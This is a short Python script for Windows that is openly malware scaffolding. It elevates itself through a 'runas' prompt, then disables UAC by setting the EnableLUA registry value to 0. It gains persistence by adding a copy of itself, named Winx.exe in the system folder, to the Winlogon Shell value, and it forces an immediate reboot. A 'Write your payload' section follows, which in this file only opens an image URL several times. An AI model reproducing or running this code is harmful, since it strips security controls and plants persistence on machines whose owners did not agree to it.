

import os
import sys

# On pywin32 Use win32comext in 2022
import webbrowser
from shutil import copyfile

from win32comext.shell import shell
ASADMIN = 'asadmin'
PROG_NAME ='Winx.exe'
ROOT_PATH = os.environ['SystemRoot']


if __name__ == '__main__':

    # If Run as User, Run as Administrator
    if sys.argv[-1] != ASADMIN:
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
        shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
        sys.exit()

    # Add persistance & Reboot for deUAC
    if os.path.isdir(os.path.join(ROOT_PATH,'Winx')) is False:
        try:
            os.mkdir(os.path.join(ROOT_PATH,'Winx'))
            os.system('reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f')
            os.system(f'reg.exe ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f /v Shell /t REG_SZ /d "explorer.exe, {ROOT_PATH}\\{PROG_NAME}"')
            copyfile(sys.argv[0], os.path.join(ROOT_PATH, PROG_NAME))
            os.system('shutdown /r /f /t 1')
        except FileExistsError:
            pass
        sys.exit()

    # Write your payload
    print(f'/d "explorer.exe,{ROOT_PATH}\\{PROG_NAME}"')
    webbrowser.open('http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg')
    webbrowser.open('http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg')
    webbrowser.open('http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg')